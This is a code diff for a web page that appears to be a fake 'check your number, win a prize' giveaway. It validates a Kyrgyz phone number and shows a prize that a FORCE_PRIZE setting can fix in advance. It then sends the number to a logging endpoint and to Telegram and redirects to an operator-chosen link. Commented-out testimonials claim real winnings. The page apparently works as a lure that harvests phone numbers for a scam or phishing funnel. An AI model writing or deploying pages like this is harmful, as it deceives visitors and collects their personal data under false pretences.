@@ -203,88 +203,79 @@
     }
 
     phoneForm.addEventListener('submit', (e) => e.preventDefault());
-    checkBtn.addEventListener('click', async (e) => {
+    checkBtn.addEventListener("click", (e) => {
   e.preventDefault();
   const phone = phoneInput.value;
   if (!validKg(phone)) {
-    phoneError.classList.remove('hidden');
+    phoneError.classList.remove("hidden");
     phoneInput.focus();
     return;
   }
 
-  // 1️⃣ Отправляем лог сразу после ввода
-  try {
-await fetch("/api/log", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ phone, prize })
-});
-  } catch(err) {
-    console.error("Ошибка отправки лога:", err);
-  }
-
-  // 2️⃣ UX states
-  phoneForm.parentElement.classList.add('hidden');
-  checking.classList.remove('hidden');
+  // UX states
+  phoneForm.parentElement.classList.add("hidden");
+  checking.classList.remove("hidden");
 
   setTimeout(() => {
-    checking.classList.add('hidden');
+    checking.classList.add("hidden");
     showPrize(phone);
   }, 1600);
 });
-    function pickPrize(){
-      if (typeof FORCE_PRIZE === 'string' && FORCE_PRIZE.length) return FORCE_PRIZE;
-      // Fair random by default
-      return PRIZES[Math.floor(Math.random() * PRIZES.length)];
-    }
 
-    const prizeModal = document.getElementById('prizeModal');
-    const prizeText = document.getElementById('prizeText');
-    const continueBtn = document.getElementById('continueBtn');
-    const closeX = document.getElementById('modalCloseX');
+function pickPrize() {
+  if (typeof FORCE_PRIZE === "string" && FORCE_PRIZE.length) return FORCE_PRIZE;
+  // Fair random by default
+  return PRIZES[Math.floor(Math.random() * PRIZES.length)];
+}
 
-    function showPrize(phone){
-      const prize = pickPrize();
-      prizeText.textContent = prize;
-      prizeModal.classList.remove('hidden');
-      prizeModal.classList.add('flex');
+const prizeModal = document.getElementById("prizeModal");
+const prizeText = document.getElementById("prizeText");
+const continueBtn = document.getElementById("continueBtn");
+const closeX = document.getElementById("modalCloseX");
 
-continueBtn.onclick = async () => {
-  const phone = phoneInput.value;    // введённый номер
-  const prize = pickPrize();         // выбранный приз
+function showPrize(phone) {
+  const prize = pickPrize();
+  prizeText.textContent = prize;
+  prizeModal.classList.remove("hidden");
+  prizeModal.classList.add("flex");
 
-  // 1️⃣ Отправляем лог на сервер
-  try {
-    await fetch("/api/log", {   // ✅ можно без домена, Vercel сам подставит
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ phone, prize }) // 🚀 отправляем как отдельные поля
-    });
-  } catch (err) {
-    console.error("Ошибка отправки лога:", err);
-  }
-
-  // 2️⃣ Если WebApp Telegram, то тоже туда
-  if (isTg) {
+  continueBtn.onclick = async () => {
+    // 1️⃣ Отправляем лог на сервер
     try {
-      window.Telegram.WebApp.sendData(JSON.stringify({ phone, prize }));
+      await fetch("/api/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ phone, prize }) // ⚡️ отдельные поля
+      });
     } catch (err) {
-      console.error("Ошибка отправки в TG WebApp:", err);
-    }
-  }
-
-  // 3️⃣ Редирект
-  window.location.href = REDIRECT_URL; // меняешь на свою ссылку
-};
-    function resetUI(){
-      prizeModal.classList.add('hidden');
-      prizeModal.classList.remove('flex');
-      phoneForm.parentElement.classList.remove('hidden');
-      phoneInput.value = '';
+      console.error("Ошибка отправки лога:", err);
     }
 
-    closeX.addEventListener('click', resetUI);
-    prizeModal.addEventListener('click', (e) => { if (e.target === prizeModal) resetUI(); });
+    // 2️⃣ Если WebApp Telegram
+    if (isTg) {
+      try {
+        window.Telegram.WebApp.sendData(JSON.stringify({ phone, prize }));
+      } catch (err) {
+        console.error("Ошибка отправки в TG WebApp:", err);
+      }
+    }
+
+    // 3️⃣ Редирект
+    window.location.href = REDIRECT_URL; // тут подставь свою ссылку
+  };
+}
+
+function resetUI() {
+  prizeModal.classList.add("hidden");
+  prizeModal.classList.remove("flex");
+  phoneForm.parentElement.classList.remove("hidden");
+  phoneInput.value = "";
+}
+
+closeX.addEventListener("click", resetUI);
+prizeModal.addEventListener("click", (e) => {
+  if (e.target === prizeModal) resetUI();
+});
     /* const reviews = [
     "Проверил номер — получил свой приз! 🎉",
     "Абдан жакшы акция, чындыгында утуп алса болот! ✅",
@@ -317,6 +308,7 @@ continueBtn.onclick = async () => {
 </div> -->
 </body>
 </html>
+
 
 
 
